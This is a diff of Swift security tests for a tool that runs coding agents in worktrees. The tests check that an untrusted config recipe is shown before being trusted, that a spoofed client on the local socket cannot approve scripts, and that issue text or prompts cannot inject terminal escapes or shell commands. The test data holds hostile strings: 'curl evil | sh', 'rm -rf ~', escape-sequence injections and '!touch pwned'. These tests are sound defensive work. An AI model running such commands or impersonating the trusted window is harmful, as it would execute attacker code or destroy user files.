@@ -302,7 +302,7 @@ private func desk(_ w: World, _ branch: String) async throws -> Worktree {
     #expect(info["trusted"]?.bool == false && info["recipes"]?["commit"]?.string == "also run curl evil | sh")   // shown before trust
     // The file changes while the sheet is open: what was shown is not what would be trusted.
     try "recipe.commit: something else entirely\n".write(toFile: w.repo.path + "/.kelp.yaml", atomically: true, encoding: .utf8)
-    w.c.notify("ui.publish", .obj(["state": .obj([:])]))
+    setenv("KELP_APP_EXECUTABLE", testExecutable, 1)
     await #expect(throws: (any Error).self) { _ = try await w.c.call("scripts.trust", .obj(["worktreeId": .string(wt.id), "digest": info["digest"] ?? .null])) }
     #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == false)
     _ = try await trustAsShown(w.c, .string(wt.id))
@@ -443,11 +443,21 @@ private func desk(_ w: World, _ branch: String) async throws -> Worktree {
     let w = try await world(); defer { w.d.stop() }
     try "setup: touch x\n".write(toFile: w.repo.path + "/.kelp.yaml", atomically: true, encoding: .utf8)
     let wt = try await desk(w, "agent-trust")
-    // An agent (any client on the socket) reads the digest and tries to trust the file itself.
-    let agent = try RPCClient(socket: w.root.appendingPathComponent("kelp.sock").path)
-    let shown = try await agent.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))
-    await #expect(throws: (any Error).self) { _ = try await agent.call("scripts.trust", .obj(["worktreeId": .string(wt.id), "digest": shown["digest"] ?? .null])) }
-    #expect(try await agent.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == false)
+    let shown = try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))
+    // An agent is another program on the same socket: it read the digest, says it's the window, and tries to trust.
+    let lines = [RPCRequest(id: nil, method: "ui.publish", params: .obj(["state": .obj([:])])),
+                 RPCRequest(id: 1, method: "scripts.trust", params: .obj(["worktreeId": .string(wt.id), "digest": shown["digest"] ?? .null]))]
+    let p = Process(); p.executableURL = URL(fileURLWithPath: "/usr/bin/nc"); p.arguments = ["-U", w.root.appendingPathComponent("kelp.sock").path]
+    let input = Pipe(), out = Pipe(); p.standardInput = input; p.standardOutput = out; p.standardError = FileHandle.nullDevice
+    try p.run()
+    for l in lines { try input.fileHandleForWriting.write(contentsOf: Wire.line(l)) }
+    let reply = String(decoding: out.fileHandleForReading.availableData, as: UTF8.self)   // the answer to id 1
+    p.terminate()
+    #expect(reply.contains("Only Kelp's window"), "\(reply)")
+    #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == false)
+    // The same call from the program the daemon takes for its app (here: this test process) is accepted.
+    #expect(try await trustAsShown(w.c, .string(wt.id))["trusted"]?.bool != false)
+    #expect(try await w.c.call("scripts.list", .obj(["worktreeId": .string(wt.id)]))["trusted"]?.bool == true)
 }
 
 /// Text from an issue reaches the agent as text: no escape sequence or control key in it acts on the terminal.
@@ -457,4 +467,13 @@ private func desk(_ w: World, _ branch: String) async throws -> Worktree {
     #expect(!t.unicodeScalars.contains { $0 == "\u{1B}" || $0 == "\r" || $0 == "\u{07}" })
     #expect(t == "Fix it[201~[Z!rm -rf ~done")   // the words stay, as words
     #expect(LiveSession.typeable("line one\r\nline two\tend") == "line one\nline two\tend")
+}
+
+/// A task's prompt goes in as a paste even on one line: an issue titled "!curl …" is text for the agent, not its shell mode.
+@Test func aLaunchPromptIsPastedNotTyped() async throws {
+    let w = try await world(); defer { w.d.stop() }
+    let wt = try await desk(w, "paste")
+    let s: Session = try await w.c.call("session.create", .obj(["worktreeId": .string(wt.id), "command": "printf '\\033[?2004hready\\n'; exec cat -v",   // a TUI that takes pastes
+                                                                 "prompt": "!touch pwned"]), as: Session.self)
+    #expect(try await waitFor(15) { (try await w.c.call("session.read", .obj(["id": .string(s.id)]))).string?.contains("[200~!touch pwned^[[201~") == true })
 }
